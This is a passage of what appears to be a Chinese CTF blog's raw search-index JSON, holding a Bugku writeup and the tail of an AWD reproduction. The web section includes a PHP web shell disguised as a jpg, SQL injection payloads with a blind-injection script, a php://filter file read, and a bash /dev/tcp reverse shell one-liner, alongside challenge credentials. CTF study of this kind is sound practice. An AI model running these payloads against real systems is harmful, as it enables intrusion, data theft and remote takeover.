class=\"string\">\"php\"</span>, <span class=\"string\">\"php5\"</span>, <span class=\"string\">\"php3\"</span>, <span class=\"string\">\"php4\"</span>, <span class=\"string\">\"php7\"</span>, <span class=\"string\">\"pht\"</span>, <span class=\"string\">\"phtml\"</span>, <span class=\"string\">\"htaccess\"</span>,<span class=\"string\">\"html\"</span>, <span class=\"string\">\"swf\"</span>, <span class=\"string\">\"htm\"</span>);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">save</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    $id=$_SESSION[<span class=\"string\">'id'</span>];</span><br><span class=\"line\">    $upfile=$_FILES[<span class=\"string\">'pic'</span>];</span><br><span class=\"line\">    $fileinfo=pathinfo($upfile[<span class=\"string\">\"name\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(in_array($fileinfo[<span class=\"string\">\"extension\"</span>],<span class=\"keyword\">$this</span>-&gt;notallow))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(<span class=\"string\">'error'</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>没有对大小写进行过滤，可以构造恶意文件上传</p>\n<p><img src=\"/2020/09/13/YJTZB2019/5.png\" alt></p>\n<p><img src=\"/2020/09/13/YJTZB2019/6.png\" alt></p>\n<h1 id=\"Thinkphp5\"><a href=\"#Thinkphp5\" class=\"headerlink\" title=\"Thinkphp5\"></a>Thinkphp5</h1><p>公开CVE，略</p>\n<p><strong>reference：</strong><br><a href=\"https://xz.aliyun.com/t/52\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/52</a><br><a href=\"https://xz.aliyun.com/t/2908#toc-0\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/2908#toc-0</a></p>\n","categories":["复现"],"tags":["AWD"]},{"title":"bugku-writeup续","url":"/2018/04/03/bugku-writeup%E7%BB%AD/","content":"<h1 id=\"杂项\"><a href=\"#杂项\" class=\"headerlink\" title=\"杂项\"></a>杂项</h1><h2 id=\"账号被盗了\"><a href=\"#账号被盗了\" class=\"headerlink\" title=\"账号被盗了\"></a>账号被盗了</h2><a id=\"more\"></a>\n<p>先修改浏览器cookie获取，之后可以获得一个可执行文件，是cf的一个刷枪客户端，wireshark抓取一下这个客户端的访问包，可以得到</p>\n<blockquote>\n<p>AUTH LOGIN<br>334 VXNlcm5hbWU6<br>YmtjdGZ0ZXN0QDE2My5jb20=<br>334 UGFzc3dvcmQ6<br>YTEyMzQ1Ng==</p>\n</blockquote>\n<p>这些base64是用户名和密码，登录邮箱即可获得flag，由于邮箱的flag已经被删除了，所以这里附上flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#123;182100518+725593795416&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"爆照-08067CTF\"><a href=\"#爆照-08067CTF\" class=\"headerlink\" title=\"爆照(08067CTF)\"></a>爆照(08067CTF)</h2><p>binwalk一下发现图面里面隐藏了很多东西，分解一下，得到很多没有后缀名的文件，这题比较坑的地方就是我不知道这些文件都是可以打开的图片，文件88里面包含了一个二维码，扫描一下即可，得到第一段；888文件修改一下后缀名为jpg即可查看一个备注信息是一段base64编码，解码得到第二段值；8888里面隐藏了一张二维码，分解扫码即可得到第三段，拼接即可得到flag</p>\n<h2 id=\"妹子的陌陌\"><a href=\"#妹子的陌陌\" class=\"headerlink\" title=\"妹子的陌陌\"></a>妹子的陌陌</h2><p>上来先binwalk一下看一下，发现还包含一个RAR文件，解压文件发现有密码，查看图片发现图片上有 <code>喜欢我吗.</code> 字样，猜测这就是密码，解压成功后得到一段文本，有一段摩斯密码，解密一下发现是一个解密网站，文本又提示是aes解密，利用题目的密钥解密即可得到一个新的图片地址，访问该图片发现是一个二维码，但是黑白反相了，用PS处理一下（图像-&gt;调整-&gt;反相）                                                                                    </p>\n<h2 id=\"听首音乐\"><a href=\"#听首音乐\" class=\"headerlink\" title=\"听首音乐\"></a>听首音乐</h2><p>音频隐写题目，用Audacity打开可以看到第一行，放大后发现像是摩斯密码，依次写出来解密一下即可，但是注意一定要是大写，小写不行。</p>\n<h2 id=\"好多数值\"><a href=\"#好多数值\" class=\"headerlink\" title=\"好多数值\"></a>好多数值</h2><p>这些数值是像素点，我们要做到就是把它们重新合成图像，根据像素点个数能够求出可能的图像的规格。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 可能的图片大小</span></span><br><span class=\"line\"><span class=\"comment\"># (1006 , 61)</span></span><br><span class=\"line\"><span class=\"comment\"># (503 , 122)</span></span><br><span class=\"line\"><span class=\"comment\"># (122 , 503)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> open(<span class=\"string\">'1.txt'</span>,<span class=\"string\">'r'</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">\tx = <span class=\"number\">503</span></span><br><span class=\"line\">\ty = <span class=\"number\">122</span></span><br><span class=\"line\">\tim = Image.new(<span class=\"string\">'RGB'</span>,(x,y))</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(x):</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(y):</span><br><span class=\"line\">\t\t\tline = file.readline()</span><br><span class=\"line\">\t\t\trgb = line.split(<span class=\"string\">','</span>)</span><br><span class=\"line\">\t\t\tim.putpixel((i,j),(int(rgb[<span class=\"number\">0</span>]),int(rgb[<span class=\"number\">1</span>]),int(rgb[<span class=\"number\">2</span>])))</span><br><span class=\"line\">im.show()</span><br></pre></td></tr></table></figure>\n<h2 id=\"convert\"><a href=\"#convert\" class=\"headerlink\" title=\"convert\"></a>convert</h2><p>题目给出了一堆二进制数，照常先转为16进制，发现前六位是 <code>526172</code>，查找资料可知这是RAR文件的文件头，所以导出RAR文件，解压查看图片属性即可看到一段base64，解码即可得到flag</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s = <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">0101001001100001011100100010000100011010000001110000000011001111100100000111001100000000000000000000110100000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"comment\"># 这里输入二进制全文，这里只有删除了大部分的内容</span></span><br><span class=\"line\"></span><br><span class=\"line\">b = hex(int(s,<span class=\"number\">2</span>))</span><br><span class=\"line\">a = <span class=\"string\">'52172211a0700cf907300000d00000000000000f7c07420902c000d09000059220000023e6370190a59b34a1d330700200000006b65792e6a70670'</span></span><br><span class=\"line\"><span class=\"comment\"># 16进制全文，注意删除前面的0x字段</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> open(<span class=\"string\">'1.rar'</span>,<span class=\"string\">'wb'</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">\tfile.write(a.decode(<span class=\"string\">'hex'</span>))</span><br></pre></td></tr></table></figure>\n<h2 id=\"好多压缩包\"><a href=\"#好多压缩包\" class=\"headerlink\" title=\"好多压缩包\"></a>好多压缩包</h2><p>下载之后是一堆压缩包，发现都有密码，打开之后看到有crc校验值，应该就是CRC32碰撞</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> zipfile</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">CrackCrc</span><span class=\"params\">(crc)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">                <span class=\"keyword\">for</span> q <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">                    s = i + j + p + q</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> crc == (binascii.crc32(s) &amp; <span class=\"number\">0xffffffff</span>):</span><br><span class=\"line\">                        f.write(s)</span><br><span class=\"line\">                        <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">CrackZip</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> I <span class=\"keyword\">in</span> range(<span class=\"number\">68</span>):</span><br><span class=\"line\">        file = <span class=\"string\">'123/out'</span> + str(I) + <span class=\"string\">'.zip'</span></span><br><span class=\"line\">        f = zipfile.ZipFile(file, <span class=\"string\">'r'</span>)</span><br><span class=\"line\">        GetCrc = f.getinfo(<span class=\"string\">'data.txt'</span>)</span><br><span class=\"line\">        crc = GetCrc.CRC</span><br><span class=\"line\">        CrackCrc(crc)</span><br><span class=\"line\"></span><br><span class=\"line\">dic = string.ascii_letters + string.digits + <span class=\"string\">'+/='</span></span><br><span class=\"line\">f = open(<span class=\"string\">'out.txt'</span>, <span class=\"string\">'w'</span>)</span><br><span class=\"line\">CrackZip()</span><br><span class=\"line\">f.close()</span><br></pre></td></tr></table></figure>\n<p>打开之后可以看到是一段base64，解码之后虽然部分是乱码，但是还可可以看到部分内容 <code>fix the file and get the flag</code> ，意思就是让我们修复这个文件，把解码后的内容导入到文件中，查看一下十六进制发现结尾是rar的文件尾部，推测这是RAR文件，则把文件头补齐一下，解压之后还是没有flag，于是再次查看压缩包，在注释里面找到了flag，（文件十六进制值里面有一个CMT字段，说明RAR文件存在注释）</p>\n<h2 id=\"一个普通的压缩包-xp0intCTF\"><a href=\"#一个普通的压缩包-xp0intCTF\" class=\"headerlink\" title=\"一个普通的压缩包(xp0intCTF)\"></a>一个普通的压缩包(xp0intCTF)</h2><p>文件下载之后是个RAR文件，解压之后是个flag.txt，但是里面内容没有flag，所以重点应该还是在这个压缩包，网上看了别人的思路是修改了文件的十六进制值部分改为 <code>A8 3C 74</code> ，这样再次进行解压即可解压出一个png图片，但是查看十六进制值发现前缀是GIF前缀，修改后缀为GIF，在ps中有两个图层，再把这两个图层分别保存为gif文件，之后再用stegsolve查看即可看到二维码，分别保存，再在ps中上下拼接成二维码，坑点在于拼接之后的二维码还需要修复一下：将下面的图片下面的左半部分拼接左上角，另外还要讲左半部分的定位快在拼接到右上角的空块中。</p>\n<h2 id=\"就五层你能解开吗\"><a href=\"#就五层你能解开吗\" class=\"headerlink\" title=\"就五层你能解开吗\"></a>就五层你能解开吗</h2><p>根据提示第一层是crc32碰撞，可以看到压缩包的3个txt文件都是6字节，所以猜测应该是用这三个TXT文件的crc32校验值来做。用github上的一个项目来做一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python crc32.py reverse 0x4dad5967</span><br></pre></td></tr></table></figure>\n<p>得到</p>\n<blockquote>\n<p>4 bytes: {0x1b, 0xd6, 0x38, 0xc2}<br>verification checksum: 0x4dad5967 (OK)<br>alternative: 9rNYn3 (OK)<br>alternative: Ay8sZC (OK)<br>alternative: QHSaFX (OK)<br>alternative: TmQA5n (OK)<br>alternative: VQT_ls (OK)<br>alternative: X28BT9 (OK)<br>alternative: _GLQzV (OK)<br>alternative: goMEPt (OK)<br>alternative: nyUKFQ (OK)<br>alternative: t_s4f3 (OK)<br>alternative: xQxVkx (OK)<br>alternative: yQ9gpa (OK)</p>\n</blockquote>\n<p>把三个校验码都跑一下，然后提取其中相对有意义的结果拼起来可以得到解压密码 <code>_CRC32_i5_n0t_s4f3</code> ，第一层解开！</p>\n<p>第二层是维吉尼亚密码，题目给出了近一万条密钥，直接暴力破解肯定是不可能的，但是我们发现密文第一个单词为 <code>rla</code> 只有三个字母，我们可以推测这三个字母的含义，我想了几个可能的情况</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">明文</th>\n<th style=\"text-align:center\">密文</th>\n<th style=\"text-align:center\">密钥</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">the</td>\n<td style=\"text-align:center\">rla</td>\n<td style=\"text-align:center\">yew</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">she</td>\n<td style=\"text-align:center\">rla</td>\n<td style=\"text-align:center\">zee</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">you</td>\n<td style=\"text-align:center\">rla</td>\n<td style=\"text-align:center\">txq</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">key</td>\n<td style=\"text-align:center\">rla</td>\n<td style=\"text-align:center\">hhc</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>查表发现只有第一个可以找到对应密钥，尝试解密一下</p>\n<blockquote>\n<p>the vigenere cipher is a method of encrypting alphabetic text by using a series of different caesar ciphers based on the letters of a keyword it is a simple form of polyalphabetic substitution so password is vigenere cipher funny</p>\n</blockquote>\n<p>语义通顺，应该就是这个，用密钥尝试解压缩包，成功，第二层解开！</p>\n<p>第三次sha1碰撞，继续上脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"></span><br><span class=\"line\">keys = string.ascii_letters + string.digits + string.punctuation</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">sha1</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">    sha1_hash = hashlib.sha1()</span><br><span class=\"line\">    sha1_hash.update(s)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sha1_hash.hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> keys:</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> keys:</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> keys:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> q <span class=\"keyword\">in</span> keys:</span><br><span class=\"line\">\t\t\t\tpassword = i + <span class=\"string\">'7'</span> + j + <span class=\"string\">'5-'</span> + p + <span class=\"string\">'4'</span> + q + <span class=\"string\">'3?'</span> </span><br><span class=\"line\">\t\t\t\tsha = sha1(password.encode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> sha[<span class=\"number\">0</span>:<span class=\"number\">7</span>] == <span class=\"string\">'619c20c'</span> <span class=\"keyword\">and</span> sha[<span class=\"number\">8</span>] == <span class=\"string\">'a'</span> <span class=\"keyword\">and</span> sha[<span class=\"number\">16</span>] == <span class=\"string\">'9'</span>:</span><br><span class=\"line\">\t\t\t\t\tprint(password)</span><br></pre></td></tr></table></figure>\n<p>得到密码 <code>I7~5-s4F3?</code> ，第三次解开！</p>\n<p>第四层要求两个exe文件md5值相同但是输出不同，网上查找了一下还真的是有，一个文件输出 <code>Hello World ;-)</code> ,另一个输出 <code>Goodbye World :-(</code> ，以此为密码即可解开</p>\n<p>第五层折腾了好久，RSA题目做的太少了，用openssl打开ssl文件看一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl rsa -pubin -in rsa_public_key.pem -text -modulus</span><br></pre></td></tr></table></figure>\n<p>可以看到e很大，也就是指数很大，网上找了一下有个wienerattack攻击，用脚本跑一下可以得到d</p>\n<blockquote>\n<p>8264667972294275017293339772371783322168822149471976834221082393409363691895</p>\n</blockquote>\n<p>那么接下来就是生成私钥了，github上有个ctftool可以生成私钥</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python rsatool.py -f PEM -o key.pem -n 46065780722597 -d 826466 -e 3546</span><br></pre></td></tr></table></figure>\n<p>PS：篇幅所限，数字我都缩小了</p>\n<p>然后利用生成的私钥解密</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl rsautl -decrypt -in flag.enc -inkey key.pem -out 1.txt</span><br></pre></td></tr></table></figure>\n<p>然后即可得到flag。</p>\n<h1 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h1><h2 id=\"文件上传2\"><a href=\"#文件上传2\" class=\"headerlink\" title=\"文件上传2\"></a>文件上传2</h2><p>这个题目有点难，找了半天的资料，刚开始什么也没有，查看元素发现有个 <code>upload.php</code>，打开发现只能上传图片，试了各种方法都没有用，最后百度了一下找到了方法，直接上传jpg文件，内容如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script language&#x3D;&quot;php&quot;&gt; system($_REQUEST[a])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n<p>发现成功上传，传递参数<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?file&#x3D;upload&#x2F;201803160110346459.jpg&amp;a&#x3D;ls</span><br></pre></td></tr></table></figure></p>\n<p>有个txt文件，查看一下<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?file&#x3D;upload&#x2F;201803160110346459.jpg&amp;a&#x3D;cat this_is_th3_F14g_154f65sd4g35f4d6f43.txt</span><br></pre></td></tr></table></figure></p>\n<p>如此可得到flag</p>\n<h2 id=\"flag-php\"><a href=\"#flag-php\" class=\"headerlink\" title=\"flag.php\"></a>flag.php</h2><p>点了确实没反应，看了提示是 <code>hint</code>，原来是要get一个hint参数为1， <code>?hint=1</code>，即可得到源代码，审计一下，只要使cookie中的ISecer的反序列化值与<strong><font face=\"futura\">$EKY</font></strong>的反序列化全等即可。但要注意的是$KEY在序列化之前，即<code>$KEY=’’</code>，序列化为 <code>s:0:””</code></p>\n<h2 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h2><p>题目主要过滤了空格，可以用 <code>/**/</code>绕过，这里介绍个 <font face=\"futura\">load_file(filename)</font>可以查看文件，然后慢慢截取即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">id&#x3D;1&#x2F;**&#x2F;and&#x2F;**&#x2F;updatexml(1,concat(0x7e,(concat(substr(load_file(0x2F7661722F746573742F6B65795F312E706870),100,30))),0x7e),1)</span><br></pre></td></tr></table></figure>\n<p>但是有一个地方贼坑，就是提交flag时的引号，一定要用题目里面要求的引号，不是英文的引号！！！</p>\n<h2 id=\"sql注入2\"><a href=\"#sql注入2\" class=\"headerlink\" title=\"sql注入2\"></a>sql注入2</h2><p>发现文件泄露，访问flag即可(贼几把坑)</p>\n<h2 id=\"文件上传2-湖湘杯\"><a href=\"#文件上传2-湖湘杯\" class=\"headerlink\" title=\"文件上传2(湖湘杯)\"></a>文件上传2(湖湘杯)</h2><p>这道题目没做出来，每次做文件上传类题目的时候总是没思路，这次看了别人的思路，直接文件读取居然就可以了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;120.24.86.145:9011&#x2F;?op&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure>\n<h2 id=\"孙xx的博客\"><a href=\"#孙xx的博客\" class=\"headerlink\" title=\"孙xx的博客\"></a>孙xx的博客</h2><p>扫描旁站发现一个PHPmyadmin，查看博客内容</p>\n<blockquote>\n<p>MySQL数据库用户名<br>define(‘DB_USER’, ‘wp’);</p>\n</blockquote>\n<p> MySQL数据库密码<br>define(‘DB_PASSWORD’, ‘wzTrzYRdbrbyjAx’); </p>\n<p>登录即可找到flag</p>\n<h2 id=\"login-SKCTF\"><a href=\"#login-SKCTF\" class=\"headerlink\" title=\"login(SKCTF)\"></a>login(SKCTF)</h2><p>题目提示是SQL布尔盲注，username字段过滤了空格等常用字符，还有逻辑符号等，新学到一个<strong><font face=\"futura\">mid()</font></strong>函数，可以绕过for和逗号</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">username&#x3D;admin&#39;^(ascii(mid((password)from(1)))&lt;&gt;55)^0#&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>\n<p>直接上脚本即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"http://118.89.219.210:49167/\"</span></span><br><span class=\"line\">payload = <span class=\"string\">''</span></span><br><span class=\"line\">data = &#123;<span class=\"string\">'username'</span>:payload,<span class=\"string\">'password'</span>:<span class=\"string\">'123'</span>&#125;</span><br><span class=\"line\">flag_yes = <span class=\"string\">'error'</span></span><br><span class=\"line\">flag = <span class=\"string\">''</span></span><br><span class=\"line\">start = <span class=\"number\">1</span></span><br><span class=\"line\">end_signal = <span class=\"literal\">True</span></span><br><span class=\"line\"><span class=\"keyword\">while</span>(end_signal):</span><br><span class=\"line\">\tend_signal = <span class=\"literal\">False</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">33</span>,<span class=\"number\">127</span>):</span><br><span class=\"line\">\t\tpayload = <span class=\"string\">\"admin'^(ascii(mid((password)from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#\"</span>.format(str(start),str(j))</span><br><span class=\"line\">\t\tdata[<span class=\"string\">'username'</span>] = payload</span><br><span class=\"line\">\t\tres = requests.post(url,data=data).text</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> flag_yes <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">\t\t\tflag += chr(j)</span><br><span class=\"line\">\t\t\tprint(flag)</span><br><span class=\"line\">\t\t\tstart += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\tend_signal = <span class=\"literal\">True</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<p><strong>注意：</strong>解出后的密码要md5解密，怪我太年轻。</p>\n<h2 id=\"PHP-encrypt-1-ISCCCTF\"><a href=\"#PHP-encrypt-1-ISCCCTF\" class=\"headerlink\" title=\"PHP_encrypt_1(ISCCCTF)\"></a>PHP_encrypt_1(ISCCCTF)</h2><p>这个题目应该是有漏掉东西，没有给出加密后的密文，网上找一下密文，反向破解即可，贴上代码<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># python3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"></span><br><span class=\"line\">cipher = <span class=\"string\">'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='</span>  <span class=\"comment\"># 题目中应该给出的密文串</span></span><br><span class=\"line\"></span><br><span class=\"line\">plain = base64.b64decode(cipher)</span><br><span class=\"line\">plain = plain.decode(<span class=\"string\">'unicode-escape'</span>)</span><br><span class=\"line\">plain1 = <span class=\"string\">''</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 构造题目中的md5串</span></span><br><span class=\"line\">m = hashlib.md5()</span><br><span class=\"line\">m.update(<span class=\"string\">b'ISCC'</span>)</span><br><span class=\"line\">key = m.hexdigest()</span><br><span class=\"line\">char = <span class=\"string\">''</span></span><br><span class=\"line\">x = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(cipher)):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> x == len(key):</span><br><span class=\"line\">\t\tx = <span class=\"number\">0</span></span><br><span class=\"line\">\tchar += key[x]</span><br><span class=\"line\">\tx += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">numflag = []    <span class=\"comment\"># 明文ascii码值</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Is_OK</span><span class=\"params\">(number)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> number &gt;= <span class=\"number\">33</span> <span class=\"keyword\">and</span> number &lt; <span class=\"number\">127</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(plain)):</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">2</span>):</span><br><span class=\"line\">\t\ttmp = <span class=\"number\">128</span> * j + ord(plain[i]) - ord(char[i])</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> Is_OK(tmp):</span><br><span class=\"line\">\t\t\tnumflag.append(tmp)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> numflag:</span><br><span class=\"line\">\tprint(chr(i),end=<span class=\"string\">\"\"</span>)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"login2-SKCTF\"><a href=\"#login2-SKCTF\" class=\"headerlink\" title=\"login2(SKCTF)\"></a>login2(SKCTF)</h2><p>这题纯学习姿势，先正常发送请求，抓包发现提示是 <code>tips</code>，base64解码，是一段php代码<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$sql=<span class=\"string\">\"SELECT username,password FROM admin WHERE username='\"</span>.$username.<span class=\"string\">\"'\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($row) &amp;&amp; $row[<span class=\"string\">'password'</span>]===md5($password))&#123;&#125;</span><br></pre></td></tr></table></figure></p>\n<p>题目也提示了union绕过，payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">username&#x3D;1&#39; union select md5(1),md5(1)#&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>\n<p>如此即可绕过，登录后是个命令执行，接下来开始重要姿势！！！！</p>\n<p><strong>反弹shell</strong></p>\n<p>你的linux主机上监听一下端口</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">nc -lvv 8888</span><br></pre></td></tr></table></figure>\n<p>然后执行命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">|bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;你的ip地址&#x2F;8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>如此即可成功反弹到shell!!!!(233333)</p>\n<p>然后读文件即可</p>\n<p><img src=\"/2018/04/03/bugku-writeup%E7%BB%AD/1.png\" alt></p>\n<h1 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h1><h2 id=\"md5加密相等绕过\"><a href=\"#md5加密相等绕过\" class=\"headerlink\" title=\"md5加密相等绕过\"></a>md5加密相等绕过</h2><p>payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?a&#x3D;240610708</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"ereg正则-00截断\"><a href=\"#ereg正则-00截断\" class=\"headerlink\" title=\"ereg正则%00截断\"></a>ereg正则%00截断</h2><p>好坑啊，提交了一个 <code>?password=9e9%00-</code>老是不对，没想到居然是 <code>?password=9e9%00*-*</code>,哎，扎心了…</p>\n<h2 id=\"extract变量覆盖\"><a href=\"#extract变量覆盖\" class=\"headerlink\" title=\"extract变量覆盖\"></a>extract变量覆盖</h2><p>比较简单，payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?shiyan&#x3D;flag&amp;flag&#x3D;php:&#x2F;&#x2F;input</span><br><span class=\"line\">flag</span><br></pre></td></tr></table></figure></p>\n<p>第二行以post方式提交</p>\n<h2 id=\"urldecode二次编码饶过\"><a href=\"#urldecode二次编码饶过\" class=\"headerlink\" title=\"urldecode二次编码饶过\"></a>urldecode二次编码饶过</h2><p>题目关键点在于，<strong><font face=\"futura\">$_GET[]</font></strong>会先对得到的参数进行一次url解码，然后在函数中又进行了一次解码，所以会产生二次编码漏洞。<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;%2568%2561%2563%256B%2565%2572%2544%254A</span><br></pre></td></tr></table></figure><br>二次编码后提交即可。</p>\n<h2 id=\"md5函数\"><a href=\"#md5函数\" class=\"headerlink\" title=\"md5函数\"></a>md5函数</h2><p>直接提交数组即可</p>\n<h2 id=\"sha函数比较绕过\"><a href=\"#sha函数比较绕过\" class=\"headerlink\" title=\"sha函数比较绕过\"></a>sha函数比较绕过</h2><p>还是提交数组即可</p>\n<h2 id=\"十六进制与数字比较\"><a href=\"#十六进制与数字比较\" class=\"headerlink\" title=\"十六进制与数字比较\"></a>十六进制与数字比较</h2><p>直接提交16进制数字即可。</p>\n<h2 id=\"strpos数组绕过\"><a href=\"#strpos数组绕过\" class=\"headerlink\" 